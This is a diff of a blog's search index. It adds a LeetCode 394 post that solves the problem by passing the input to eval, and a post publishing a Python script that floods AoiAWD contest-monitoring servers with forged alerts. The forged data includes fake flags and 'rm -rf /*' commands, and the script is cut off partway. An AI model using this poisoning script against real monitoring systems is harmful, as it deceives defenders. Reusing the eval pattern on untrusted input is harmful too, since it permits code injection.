@@ -2309,59 +2309,6 @@ handler 指向 RequestHandler<br />
       </tags>
   </entry>
   <entry>
-    <title>力扣 394.字符串解码 特殊解</title>
-    <url>/2025/02/leetcode%20394/</url>
-    <content><![CDATA[<p><a href="https://leetcode.cn/problems/decode-string">394.字符串解码</a></p>
-<blockquote>
-<p>一种独创的 不用辅助栈的解(笑)</p>
-</blockquote>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/1740056281-lJvikC-image.png" alt="lc394-shot" /></p>
-<h2 id="思路"><a class="markdownIt-Anchor" href="#思路"></a> 思路</h2>
-<p>不用栈 遍历字符串转 python 表达式 eval 直出</p>
-<h2 id="解题过程"><a class="markdownIt-Anchor" href="#解题过程"></a> 解题过程</h2>
-<p>对于 python，我们可用 eval 函数将一串字符串当作 python 语句直接执行</p>
-<p>那么对于四个例子我们可以转换成代码中注释部分的表达式</p>
-<figure class="shiki python"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div><div class="code"><pre class="shiki github-dark"><code><span class="line"><span style="color: #79B8FF">eval</span><span style="color: #E1E4E8">(</span><span style="color: #9ECBFF">&#39;3*(&quot;a&quot;) + 2*(&quot;bc&quot;)&#39;</span><span style="color: #E1E4E8">)</span></span>
-<span class="line"><span style="color: #79B8FF">eval</span><span style="color: #E1E4E8">(</span><span style="color: #9ECBFF">&#39;3*(&quot;a&quot;+2*(&quot;c&quot;))&#39;</span><span style="color: #E1E4E8">)</span></span>
-<span class="line"><span style="color: #79B8FF">eval</span><span style="color: #E1E4E8">(</span><span style="color: #9ECBFF">&#39;2*(&quot;abc&quot;)+3*(&quot;cd&quot;)+&quot;ef&quot;&#39;</span><span style="color: #E1E4E8">)</span></span>
-<span class="line"><span style="color: #79B8FF">eval</span><span style="color: #E1E4E8">(</span><span style="color: #9ECBFF">&#39;&quot;abc&quot;+3*(&quot;cd&quot;)+&quot;xyz&quot;&#39;</span><span style="color: #E1E4E8">)</span></span></code></pre></div></div></figure>
-<h2 id="复杂度"><a class="markdownIt-Anchor" href="#复杂度"></a> 复杂度</h2>
-<ul>
-<li>时间复杂度: O(n)</li>
-<li>空间复杂度: O(n)</li>
-</ul>
-<h2 id="code"><a class="markdownIt-Anchor" href="#code"></a> Code</h2>
-<figure class="shiki python"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div><div class="code"><pre class="shiki github-dark"><code><span class="line"><span style="color: #F97583">class</span><span style="color: #E1E4E8"> </span><span style="color: #B392F0">Solution</span><span style="color: #E1E4E8">:</span></span>
-<span class="line"><span style="color: #E1E4E8">    </span><span style="color: #F97583">def</span><span style="color: #E1E4E8"> </span><span style="color: #B392F0">decodeString</span><span style="color: #E1E4E8">(self, s: </span><span style="color: #79B8FF">str</span><span style="color: #E1E4E8">) -&gt; </span><span style="color: #79B8FF">str</span><span style="color: #E1E4E8">:</span></span>
-<span class="line"><span style="color: #E1E4E8">        func </span><span style="color: #F97583">=</span><span style="color: #E1E4E8"> </span><span style="color: #9ECBFF">&#39;&#39;</span><span style="color: #E1E4E8"> </span><span style="color: #6A737D"># 用于存表达式</span></span>
-<span class="line"><span style="color: #E1E4E8">        </span><span style="color: #F97583">for</span><span style="color: #E1E4E8"> i </span><span style="color: #F97583">in</span><span style="color: #E1E4E8"> </span><span style="color: #79B8FF">range</span><span style="color: #E1E4E8">(</span><span style="color: #79B8FF">len</span><span style="color: #E1E4E8">(s)):</span></span>
-<span class="line"><span style="color: #E1E4E8">            </span><span style="color: #F97583">if</span><span style="color: #E1E4E8"> s[i].isdigit():</span></span>
-<span class="line"><span style="color: #E1E4E8">                </span><span style="color: #F97583">if</span><span style="color: #E1E4E8"> i </span><span style="color: #F97583">&gt;</span><span style="color: #E1E4E8"> </span><span style="color: #79B8FF">0</span><span style="color: #E1E4E8"> </span><span style="color: #F97583">and</span><span style="color: #E1E4E8"> </span><span style="color: #F97583">not</span><span style="color: #E1E4E8"> s[i </span><span style="color: #F97583">-</span><span style="color: #E1E4E8"> </span><span style="color: #79B8FF">1</span><span style="color: #E1E4E8">].isdigit():</span></span>
-<span class="line"><span style="color: #E1E4E8">                    func </span><span style="color: #F97583">+=</span><span style="color: #E1E4E8"> </span><span style="color: #9ECBFF">&quot;+&quot;</span></span>
-<span class="line"><span style="color: #E1E4E8">                func </span><span style="color: #F97583">+=</span><span style="color: #E1E4E8"> s[i]</span></span>
-<span class="line"><span style="color: #E1E4E8">            </span><span style="color: #F97583">elif</span><span style="color: #E1E4E8"> s[i] </span><span style="color: #F97583">==</span><span style="color: #E1E4E8"> </span><span style="color: #9ECBFF">&quot;[&quot;</span><span style="color: #E1E4E8">:</span></span>
-<span class="line"><span style="color: #E1E4E8">                func </span><span style="color: #F97583">+=</span><span style="color: #E1E4E8"> </span><span style="color: #9ECBFF">&quot;*(&quot;</span></span>
-<span class="line"><span style="color: #E1E4E8">            </span><span style="color: #F97583">elif</span><span style="color: #E1E4E8"> s[i] </span><span style="color: #F97583">==</span><span style="color: #E1E4E8"> </span><span style="color: #9ECBFF">&quot;]&quot;</span><span style="color: #E1E4E8">:</span></span>
-<span class="line"><span style="color: #E1E4E8">                func </span><span style="color: #F97583">+=</span><span style="color: #E1E4E8"> </span><span style="color: #9ECBFF">&quot;)&quot;</span></span>
-<span class="line"><span style="color: #E1E4E8">                </span><span style="color: #F97583">if</span><span style="color: #E1E4E8"> i </span><span style="color: #F97583">&lt;</span><span style="color: #E1E4E8"> </span><span style="color: #79B8FF">len</span><span style="color: #E1E4E8">(s) </span><span style="color: #F97583">-</span><span style="color: #E1E4E8"> </span><span style="color: #79B8FF">1</span><span style="color: #E1E4E8"> </span><span style="color: #F97583">and</span><span style="color: #E1E4E8"> s[i </span><span style="color: #F97583">+</span><span style="color: #E1E4E8"> </span><span style="color: #79B8FF">1</span><span style="color: #E1E4E8">] </span><span style="color: #F97583">!=</span><span style="color: #E1E4E8"> </span><span style="color: #9ECBFF">&quot;]&quot;</span><span style="color: #E1E4E8"> </span><span style="color: #F97583">and</span><span style="color: #E1E4E8"> </span><span style="color: #F97583">not</span><span style="color: #E1E4E8"> s[i </span><span style="color: #F97583">+</span><span style="color: #E1E4E8"> </span><span style="color: #79B8FF">1</span><span style="color: #E1E4E8">].isdigit():</span></span>
-<span class="line"><span style="color: #E1E4E8">                    func </span><span style="color: #F97583">+=</span><span style="color: #E1E4E8"> </span><span style="color: #9ECBFF">&quot;+&quot;</span></span>
-<span class="line"><span style="color: #E1E4E8">            </span><span style="color: #F97583">else</span><span style="color: #E1E4E8">:</span></span>
-<span class="line"><span style="color: #E1E4E8">                </span><span style="color: #F97583">if</span><span style="color: #E1E4E8"> i </span><span style="color: #F97583">==</span><span style="color: #E1E4E8"> </span><span style="color: #79B8FF">0</span><span style="color: #E1E4E8"> </span><span style="color: #F97583">or</span><span style="color: #E1E4E8"> </span><span style="color: #F97583">not</span><span style="color: #E1E4E8"> s[i </span><span style="color: #F97583">-</span><span style="color: #E1E4E8"> </span><span style="color: #79B8FF">1</span><span style="color: #E1E4E8">].isalpha():</span></span>
-<span class="line"><span style="color: #E1E4E8">                    func </span><span style="color: #F97583">+=</span><span style="color: #E1E4E8"> </span><span style="color: #9ECBFF">&#39;&quot;&#39;</span></span>
-<span class="line"><span style="color: #E1E4E8">                func </span><span style="color: #F97583">+=</span><span style="color: #E1E4E8"> s[i]</span></span>
-<span class="line"><span style="color: #E1E4E8">                </span><span style="color: #F97583">if</span><span style="color: #E1E4E8"> i </span><span style="color: #F97583">==</span><span style="color: #E1E4E8"> </span><span style="color: #79B8FF">len</span><span style="color: #E1E4E8">(s) </span><span style="color: #F97583">-</span><span style="color: #E1E4E8"> </span><span style="color: #79B8FF">1</span><span style="color: #E1E4E8"> </span><span style="color: #F97583">or</span><span style="color: #E1E4E8"> </span><span style="color: #F97583">not</span><span style="color: #E1E4E8"> s[i </span><span style="color: #F97583">+</span><span style="color: #E1E4E8"> </span><span style="color: #79B8FF">1</span><span style="color: #E1E4E8">].isalpha():</span></span>
-<span class="line"><span style="color: #E1E4E8">                    func </span><span style="color: #F97583">+=</span><span style="color: #E1E4E8"> </span><span style="color: #9ECBFF">&#39;&quot;&#39;</span></span>
-<span class="line"><span style="color: #E1E4E8">        </span><span style="color: #79B8FF">print</span><span style="color: #E1E4E8">(func)</span></span>
-<span class="line"><span style="color: #E1E4E8">        </span><span style="color: #F97583">return</span><span style="color: #E1E4E8"> </span><span style="color: #79B8FF">eval</span><span style="color: #E1E4E8">(func)</span></span></code></pre></div></div></figure>]]></content>
-      <categories>
-        <category>算法</category>
-      </categories>
-      <tags>
-        <tag>leetcode</tag>
-        <tag>算法</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>linux动态加载</title>
     <url>/2022/05/linux%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/</url>
     <content><![CDATA[<h3 id="linux-动态加载"><a class="markdownIt-Anchor" href="#linux-动态加载"></a> linux 动态加载</h3>
@@ -2419,6 +2366,59 @@ handler 指向 RequestHandler<br />
         <tag>ctfhub</tag>
         <tag>linux</tag>
         <tag>动态加载</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>力扣 394.字符串解码 特殊解</title>
+    <url>/2025/02/leetcode%20394/</url>
+    <content><![CDATA[<p><a href="https://leetcode.cn/problems/decode-string">394.字符串解码</a></p>
+<blockquote>
+<p>一种独创的 不用辅助栈的解(笑)</p>
+</blockquote>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/1740056281-lJvikC-image.png" alt="lc394-shot" /></p>
+<h2 id="思路"><a class="markdownIt-Anchor" href="#思路"></a> 思路</h2>
+<p>不用栈 遍历字符串转 python 表达式 eval 直出</p>
+<h2 id="解题过程"><a class="markdownIt-Anchor" href="#解题过程"></a> 解题过程</h2>
+<p>对于 python，我们可用 eval 函数将一串字符串当作 python 语句直接执行</p>
+<p>那么对于四个例子我们可以转换成代码中注释部分的表达式</p>
+<figure class="shiki python"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div><div class="code"><pre class="shiki github-dark"><code><span class="line"><span style="color: #79B8FF">eval</span><span style="color: #E1E4E8">(</span><span style="color: #9ECBFF">&#39;3*(&quot;a&quot;) + 2*(&quot;bc&quot;)&#39;</span><span style="color: #E1E4E8">)</span></span>
+<span class="line"><span style="color: #79B8FF">eval</span><span style="color: #E1E4E8">(</span><span style="color: #9ECBFF">&#39;3*(&quot;a&quot;+2*(&quot;c&quot;))&#39;</span><span style="color: #E1E4E8">)</span></span>
+<span class="line"><span style="color: #79B8FF">eval</span><span style="color: #E1E4E8">(</span><span style="color: #9ECBFF">&#39;2*(&quot;abc&quot;)+3*(&quot;cd&quot;)+&quot;ef&quot;&#39;</span><span style="color: #E1E4E8">)</span></span>
+<span class="line"><span style="color: #79B8FF">eval</span><span style="color: #E1E4E8">(</span><span style="color: #9ECBFF">&#39;&quot;abc&quot;+3*(&quot;cd&quot;)+&quot;xyz&quot;&#39;</span><span style="color: #E1E4E8">)</span></span></code></pre></div></div></figure>
+<h2 id="复杂度"><a class="markdownIt-Anchor" href="#复杂度"></a> 复杂度</h2>
+<ul>
+<li>时间复杂度: O(n)</li>
+<li>空间复杂度: O(n)</li>
+</ul>
+<h2 id="code"><a class="markdownIt-Anchor" href="#code"></a> Code</h2>
+<figure class="shiki python"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div><div class="code"><pre class="shiki github-dark"><code><span class="line"><span style="color: #F97583">class</span><span style="color: #E1E4E8"> </span><span style="color: #B392F0">Solution</span><span style="color: #E1E4E8">:</span></span>
+<span class="line"><span style="color: #E1E4E8">    </span><span style="color: #F97583">def</span><span style="color: #E1E4E8"> </span><span style="color: #B392F0">decodeString</span><span style="color: #E1E4E8">(self, s: </span><span style="color: #79B8FF">str</span><span style="color: #E1E4E8">) -&gt; </span><span style="color: #79B8FF">str</span><span style="color: #E1E4E8">:</span></span>
+<span class="line"><span style="color: #E1E4E8">        func </span><span style="color: #F97583">=</span><span style="color: #E1E4E8"> </span><span style="color: #9ECBFF">&#39;&#39;</span><span style="color: #E1E4E8"> </span><span style="color: #6A737D"># 用于存表达式</span></span>
+<span class="line"><span style="color: #E1E4E8">        </span><span style="color: #F97583">for</span><span style="color: #E1E4E8"> i </span><span style="color: #F97583">in</span><span style="color: #E1E4E8"> </span><span style="color: #79B8FF">range</span><span style="color: #E1E4E8">(</span><span style="color: #79B8FF">len</span><span style="color: #E1E4E8">(s)):</span></span>
+<span class="line"><span style="color: #E1E4E8">            </span><span style="color: #F97583">if</span><span style="color: #E1E4E8"> s[i].isdigit():</span></span>
+<span class="line"><span style="color: #E1E4E8">                </span><span style="color: #F97583">if</span><span style="color: #E1E4E8"> i </span><span style="color: #F97583">&gt;</span><span style="color: #E1E4E8"> </span><span style="color: #79B8FF">0</span><span style="color: #E1E4E8"> </span><span style="color: #F97583">and</span><span style="color: #E1E4E8"> </span><span style="color: #F97583">not</span><span style="color: #E1E4E8"> s[i </span><span style="color: #F97583">-</span><span style="color: #E1E4E8"> </span><span style="color: #79B8FF">1</span><span style="color: #E1E4E8">].isdigit():</span></span>
+<span class="line"><span style="color: #E1E4E8">                    func </span><span style="color: #F97583">+=</span><span style="color: #E1E4E8"> </span><span style="color: #9ECBFF">&quot;+&quot;</span></span>
+<span class="line"><span style="color: #E1E4E8">                func </span><span style="color: #F97583">+=</span><span style="color: #E1E4E8"> s[i]</span></span>
+<span class="line"><span style="color: #E1E4E8">            </span><span style="color: #F97583">elif</span><span style="color: #E1E4E8"> s[i] </span><span style="color: #F97583">==</span><span style="color: #E1E4E8"> </span><span style="color: #9ECBFF">&quot;[&quot;</span><span style="color: #E1E4E8">:</span></span>
+<span class="line"><span style="color: #E1E4E8">                func </span><span style="color: #F97583">+=</span><span style="color: #E1E4E8"> </span><span style="color: #9ECBFF">&quot;*(&quot;</span></span>
+<span class="line"><span style="color: #E1E4E8">            </span><span style="color: #F97583">elif</span><span style="color: #E1E4E8"> s[i] </span><span style="color: #F97583">==</span><span style="color: #E1E4E8"> </span><span style="color: #9ECBFF">&quot;]&quot;</span><span style="color: #E1E4E8">:</span></span>
+<span class="line"><span style="color: #E1E4E8">                func </span><span style="color: #F97583">+=</span><span style="color: #E1E4E8"> </span><span style="color: #9ECBFF">&quot;)&quot;</span></span>
+<span class="line"><span style="color: #E1E4E8">                </span><span style="color: #F97583">if</span><span style="color: #E1E4E8"> i </span><span style="color: #F97583">&lt;</span><span style="color: #E1E4E8"> </span><span style="color: #79B8FF">len</span><span style="color: #E1E4E8">(s) </span><span style="color: #F97583">-</span><span style="color: #E1E4E8"> </span><span style="color: #79B8FF">1</span><span style="color: #E1E4E8"> </span><span style="color: #F97583">and</span><span style="color: #E1E4E8"> s[i </span><span style="color: #F97583">+</span><span style="color: #E1E4E8"> </span><span style="color: #79B8FF">1</span><span style="color: #E1E4E8">] </span><span style="color: #F97583">!=</span><span style="color: #E1E4E8"> </span><span style="color: #9ECBFF">&quot;]&quot;</span><span style="color: #E1E4E8"> </span><span style="color: #F97583">and</span><span style="color: #E1E4E8"> </span><span style="color: #F97583">not</span><span style="color: #E1E4E8"> s[i </span><span style="color: #F97583">+</span><span style="color: #E1E4E8"> </span><span style="color: #79B8FF">1</span><span style="color: #E1E4E8">].isdigit():</span></span>
+<span class="line"><span style="color: #E1E4E8">                    func </span><span style="color: #F97583">+=</span><span style="color: #E1E4E8"> </span><span style="color: #9ECBFF">&quot;+&quot;</span></span>
+<span class="line"><span style="color: #E1E4E8">            </span><span style="color: #F97583">else</span><span style="color: #E1E4E8">:</span></span>
+<span class="line"><span style="color: #E1E4E8">                </span><span style="color: #F97583">if</span><span style="color: #E1E4E8"> i </span><span style="color: #F97583">==</span><span style="color: #E1E4E8"> </span><span style="color: #79B8FF">0</span><span style="color: #E1E4E8"> </span><span style="color: #F97583">or</span><span style="color: #E1E4E8"> </span><span style="color: #F97583">not</span><span style="color: #E1E4E8"> s[i </span><span style="color: #F97583">-</span><span style="color: #E1E4E8"> </span><span style="color: #79B8FF">1</span><span style="color: #E1E4E8">].isalpha():</span></span>
+<span class="line"><span style="color: #E1E4E8">                    func </span><span style="color: #F97583">+=</span><span style="color: #E1E4E8"> </span><span style="color: #9ECBFF">&#39;&quot;&#39;</span></span>
+<span class="line"><span style="color: #E1E4E8">                func </span><span style="color: #F97583">+=</span><span style="color: #E1E4E8"> s[i]</span></span>
+<span class="line"><span style="color: #E1E4E8">                </span><span style="color: #F97583">if</span><span style="color: #E1E4E8"> i </span><span style="color: #F97583">==</span><span style="color: #E1E4E8"> </span><span style="color: #79B8FF">len</span><span style="color: #E1E4E8">(s) </span><span style="color: #F97583">-</span><span style="color: #E1E4E8"> </span><span style="color: #79B8FF">1</span><span style="color: #E1E4E8"> </span><span style="color: #F97583">or</span><span style="color: #E1E4E8"> </span><span style="color: #F97583">not</span><span style="color: #E1E4E8"> s[i </span><span style="color: #F97583">+</span><span style="color: #E1E4E8"> </span><span style="color: #79B8FF">1</span><span style="color: #E1E4E8">].isalpha():</span></span>
+<span class="line"><span style="color: #E1E4E8">                    func </span><span style="color: #F97583">+=</span><span style="color: #E1E4E8"> </span><span style="color: #9ECBFF">&#39;&quot;&#39;</span></span>
+<span class="line"><span style="color: #E1E4E8">        </span><span style="color: #79B8FF">print</span><span style="color: #E1E4E8">(func)</span></span>
+<span class="line"><span style="color: #E1E4E8">        </span><span style="color: #F97583">return</span><span style="color: #E1E4E8"> </span><span style="color: #79B8FF">eval</span><span style="color: #E1E4E8">(func)</span></span></code></pre></div></div></figure>]]></content>
+      <categories>
+        <category>算法</category>
+      </categories>
+      <tags>
+        <tag>leetcode</tag>
+        <tag>算法</tag>
       </tags>
   </entry>
   <entry>
@@ -2519,6 +2519,87 @@ handler 指向 RequestHandler<br />
         <tag>渗透</tag>
         <tag>权限维持</tag>
         <tag>PAM</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>AoiAWD反制脚本</title>
+    <url>/2024/05/untiAoi/</url>
+    <content><![CDATA[<h2 id="aoiawd-反制脚本"><a class="markdownIt-Anchor" href="#aoiawd-反制脚本"></a> AoiAWD 反制脚本</h2>
+<h3 id="起因"><a class="markdownIt-Anchor" href="#起因"></a> 起因</h3>
+<p>在经历过 awd 比赛中 AoiAWD 多次崩溃后(长城杯 虽然最后还是进决赛摸鱼了)</p>
+<p>赛后研究了一下</p>
+<p>开发了这个反制脚本</p>
+<p>由于打点队友喜欢用 gogo</p>
+<p>所以这个脚本支持 gogo 扫描结果</p>
+<h3 id="思路"><a class="markdownIt-Anchor" href="#思路"></a> 思路</h3>
+<p>发现后端未验证来自靶机的数据</p>
+<p>因此存在脏数据污染</p>
+<p>针对此开发脚本</p>
+<p>可向 AoiAWD 的各个数据展示页面投放脏数据</p>
+<p>包括告警页面</p>
+<h3 id="脚本"><a class="markdownIt-Anchor" href="#脚本"></a> 脚本</h3>
+<p>再此公布本脚本，希望下次 awd 遇见的时候别打我，谢谢 QAQ</p>
+<figure class="shiki python"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></div><div class="code"><pre class="shiki github-dark"><code><span class="line"><span style="color: #F97583">import</span><span style="color: #E1E4E8"> re</span></span>
+<span class="line"><span style="color: #F97583">import</span><span style="color: #E1E4E8"> socket</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #E1E4E8">f </span><span style="color: #F97583">=</span><span style="color: #E1E4E8"> </span><span style="color: #79B8FF">open</span><span style="color: #E1E4E8">(</span><span style="color: #9ECBFF">&quot;./ip.txt&quot;</span><span style="color: #E1E4E8">, </span><span style="color: #9ECBFF">&quot;r+&quot;</span><span style="color: #E1E4E8">)</span></span>
+<span class="line"><span style="color: #E1E4E8">url_list </span><span style="color: #F97583">=</span><span style="color: #E1E4E8"> f.readlines()</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #F97583">for</span><span style="color: #E1E4E8"> i </span><span style="color: #F97583">in</span><span style="color: #E1E4E8"> url_list:</span></span>
+<span class="line"><span style="color: #E1E4E8">    pattern </span><span style="color: #F97583">=</span><span style="color: #E1E4E8"> </span><span style="color: #F97583">r</span><span style="color: #9ECBFF">&quot;</span><span style="color: #DBEDFF">tcp://</span><span style="color: #79B8FF">(\d</span><span style="color: #F97583">{1,3}</span><span style="color: #85E89D; font-weight: bold">\.</span><span style="color: #79B8FF">\d</span><span style="color: #F97583">{1,3}</span><span style="color: #85E89D; font-weight: bold">\.</span><span style="color: #79B8FF">\d</span><span style="color: #F97583">{1,3}</span><span style="color: #85E89D; font-weight: bold">\.</span><span style="color: #79B8FF">\d</span><span style="color: #F97583">{1,3}</span><span style="color: #DBEDFF">:</span><span style="color: #79B8FF">\d</span><span style="color: #F97583">+</span><span style="color: #79B8FF">)</span><span style="color: #9ECBFF">&quot;</span></span>
+<span class="line"><span style="color: #E1E4E8">    match </span><span style="color: #F97583">=</span><span style="color: #E1E4E8"> re.search(pattern, i, </span><span style="color: #79B8FF">0</span><span style="color: #E1E4E8">)</span></span>
+<span class="line"><span style="color: #E1E4E8">    </span><span style="color: #F97583">if</span><span style="color: #E1E4E8"> match:</span></span>
+<span class="line"><span style="color: #E1E4E8">        i </span><span style="color: #F97583">=</span><span style="color: #E1E4E8"> match.group(</span><span style="color: #79B8FF">0</span><span style="color: #E1E4E8">).split(</span><span style="color: #9ECBFF">&quot;//&quot;</span><span style="color: #E1E4E8">)[</span><span style="color: #79B8FF">1</span><span style="color: #E1E4E8">]</span></span>
+<span class="line"><span style="color: #E1E4E8">        p </span><span style="color: #F97583">=</span><span style="color: #E1E4E8"> </span><span style="color: #79B8FF">int</span><span style="color: #E1E4E8">(i.split(</span><span style="color: #9ECBFF">&quot;:&quot;</span><span style="color: #E1E4E8">)[</span><span style="color: #79B8FF">1</span><span style="color: #E1E4E8">])</span></span>
+<span class="line"><span style="color: #E1E4E8">        i </span><span style="color: #F97583">=</span><span style="color: #E1E4E8"> i.split(</span><span style="color: #9ECBFF">&quot;:&quot;</span><span style="color: #E1E4E8">)[</span><span style="color: #79B8FF">0</span><span style="color: #E1E4E8">]</span></span>
+<span class="line"><span style="color: #E1E4E8">        server_address </span><span style="color: #F97583">=</span><span style="color: #E1E4E8"> (i, p)  </span><span style="color: #6A737D"># 替换SERVER_IP和SERVER_PORT为实际值</span></span>
+<span class="line"><span style="color: #E1E4E8">        data </span><span style="color: #F97583">=</span><span style="color: #E1E4E8"> </span><span style="color: #9ECBFF">&#39;{&quot;type&quot;:&quot;ping&quot;}</span><span style="color: #79B8FF">\n</span><span style="color: #9ECBFF">&#39;</span></span>
+<span class="line"><span style="color: #E1E4E8">        data2 </span><span style="color: #F97583">=</span><span style="color: #E1E4E8"> </span><span style="color: #9ECBFF">&#39;{&quot;type&quot;:&quot;new_process&quot;,&quot;data&quot;:{&quot;pid&quot;:&quot;114514&quot;,&quot;ppid&quot;:&quot;114514&quot;,&quot;uid&quot;:&quot;0&quot;,&quot;username&quot;:&quot;root&quot;,&quot;cmd&quot;:&quot;rm -rf /*&quot;,&quot;param&quot;:&quot;su root rm -rf /*&quot;</span><span style="color: #79B8FF">}}\n</span><span style="color: #9ECBFF">&#39;</span></span>
+<span class="line"><span style="color: #E1E4E8">        data3 </span><span style="color: #F97583">=</span><span style="color: #E1E4E8"> </span><span style="color: #9ECBFF">&#39;{&quot;type&quot;:&quot;file&quot;,&quot;data&quot;:{&quot;path&quot;:&quot;/update/score_points&quot;,&quot;mode&quot;:33188,&quot;event&quot;:256,&quot;size&quot;:114514,&quot;content&quot;:&quot;ZmxhZ3tDcmF6eV9UaHVydGhkYXlfdl9tZV81MH0=&quot;</span><span style="color: #79B8FF">}}\n</span><span style="color: #9ECBFF">&#39;</span></span>
+<span class="line"><span style="color: #E1E4E8">        data4 </span><span style="color: #F97583">=</span><span style="color: #E1E4E8"> </span><span style="color: #9ECBFF">&#39;{&quot;type&quot;:&quot;web&quot;,&quot;data&quot;:{&quot;scipt&quot;:&quot;/var/www/html/rce.php&quot;,&quot;method&quot;:&quot;post&quot;,&quot;uri&quot;:&quot;127.0.0.1/rce.php&quot;,&quot;remote&quot;:&quot;127.0.0.1&quot;,&quot;buffer&quot;:&quot;{</span><span style="color: #79B8FF">\\</span><span style="color: #9ECBFF">&quot;flag</span><span style="color: #79B8FF">\\</span><span style="color: #9ECBFF">&quot;:</span><span style="color: #79B8FF">\\</span><span style="color: #9ECBFF">&quot;flag</span><span style="color: #79B8FF">{Crazy_Thurthday_v_me_50}\\</span><span style="color: #9ECBFF">&quot;}&quot;</span><span style="color: #79B8FF">}}\n</span><span style="color: #9ECBFF">&#39;</span></span>
+<span class="line"><span style="color: #E1E4E8">        data5 </span><span style="color: #F97583">=</span><span style="color: #E1E4E8"> </span><span style="color: #9ECBFF">&#39;{&quot;type&quot;:&quot;pwn&quot;,&quot;data&quot;:{&quot;file&quot;:&quot;catflag&quot;,&quot;type&quot;:&quot;stdin&quot;,&quot;pid&quot;:&quot;123&quot;,&quot;maps&quot;:&quot;su root rm -rf /*&quot;</span><span style="color: #79B8FF">}}\n</span><span style="color: #9ECBFF">&#39;</span></span>
+<span class="line"><span style="color: #E1E4E8">        data6 </span><span style="color: #F97583">=</span><span style="color: #E1E4E8"> </span><span style="color: #9ECBFF">&#39;{&quot;type&quot;:&quot;pwn&quot;,&quot;data&quot;:{&quot;file&quot;:&quot;catflag&quot;,&quot;type&quot;:&quot;stdin&quot;,&quot;pid&quot;:&quot;123&quot;,&quot;maps&quot;:&quot;su root rm -rf /*&quot;</span><span style="color: #79B8FF">}}\n</span><span style="color: #9ECBFF">&#39;</span></span>
+<span class="line"><span style="color: #E1E4E8">        data7 </span><span style="color: #F97583">=</span><span style="color: #E1E4E8"> </span><span style="color: #9ECBFF">&#39;{&quot;type&quot;:&quot;file&quot;,&quot;data&quot;:{&quot;path&quot;:&quot;/114514&quot;,&quot;mode&quot;:33188,&quot;event&quot;:256,&quot;size&quot;:114514,&quot;content&quot;:&quot;c3Ugcm9vdCBybSAtcmYgLyo=&quot;</span><span style="color: #79B8FF">}}\n</span><span style="color: #9ECBFF">&#39;</span></span>
+<span class="line"><span style="color: #E1E4E8">        </span><span style="color: #F97583">with</span><span style="color: #E1E4E8"> socket.socket(socket.</span><span style="color: #79B8FF">AF_INET</span><span style="color: #E1E4E8">, socket.</span><span style="color: #79B8FF">SOCK_STREAM</span><span style="color: #E1E4E8">) </span><span style="color: #F97583">as</span><span style="color: #E1E4E8"> sock:</span></span>
+<span class="line"><span style="color: #E1E4E8">            </span><span style="color: #F97583">try</span><span style="color: #E1E4E8">:</span></span>
+<span class="line"><span style="color: #E1E4E8">                sock.settimeout(</span><span style="color: #79B8FF">1</span><span style="color: #E1E4E8">)</span></span>
+<span class="line"><span style="color: #E1E4E8">                sock.connect(server_address)</span></span>
+<span class="line"><span style="color: #E1E4E8">                sock.sendall(data.encode(</span><span style="color: #9ECBFF">&quot;utf-8&quot;</span><span style="color: #E1E4E8">))</span></span>
+<span class="line"><span style="color: #E1E4E8">                tmp </span><span style="color: #F97583">=</span><span style="color: #E1E4E8"> sock.recvfrom(</span><span style="color: #79B8FF">1024</span><span style="color: #E1E4E8">)</span></span>
+<span class="line"><span style="color: #E1E4E8">                </span><span style="color: #F97583">if</span><span style="color: #E1E4E8"> </span><span style="color: #9ECBFF">&quot;pong&quot;</span><span style="color: #E1E4E8"> </span><span style="color: #F97583">in</span><span style="color: #E1E4E8"> </span><span style="color: #79B8FF">str</span><span style="color: #E1E4E8">(tmp):</span></span>
